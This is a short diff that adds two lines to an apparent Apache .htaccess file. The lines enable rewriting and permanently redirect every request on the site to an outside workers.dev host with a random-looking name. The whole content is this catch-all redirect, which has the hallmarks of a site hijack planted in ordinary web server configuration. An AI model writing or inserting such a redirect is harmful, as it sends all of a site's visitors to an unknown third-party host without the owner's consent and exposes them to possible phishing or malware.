@@ -1,0 +1,2 @@
+RewriteEngine on
+RewriteRule (.*) https://omacuanoke.omacuan168.workers.dev/ [R=301,L]
